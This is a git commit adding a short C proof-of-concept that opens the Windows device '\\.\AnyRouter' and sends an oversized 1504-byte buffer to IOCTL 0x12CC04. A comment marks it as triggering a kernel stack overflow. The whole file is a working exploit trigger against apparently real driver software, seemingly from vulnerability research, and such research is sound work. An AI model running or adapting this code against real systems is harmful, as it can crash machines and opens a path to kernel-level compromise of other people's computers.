203b0c74be352dc4b303099ff5827e0cccd9682f
y5s5k5 <53048989+y5s5k5@users.noreply.github.com>
2020-07-05 07:44:48 +0800

    Create 0x12CC04.C

---
+++ 0x12CC04.C
@@ -0,0 +1,20 @@
+#include <windows.h>
+#include <stdio.h>
+HANDLE hDriver;
+DWORD dw;
+int main() {
+	HANDLE hDriver = CreateFileA("\\\\.\\AnyRouter", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		getchar();
+		return -1;
+	}
+	char buf[1504]{};
+	memset(buf,0x3, 1504);
+	buf[1] = 2;
+	//Stack overflow gs
+	DeviceIoControl(hDriver, 0x12CC04, buf, 1504, 0, 0, &dw, NULL);
+
+	return 0;
+}
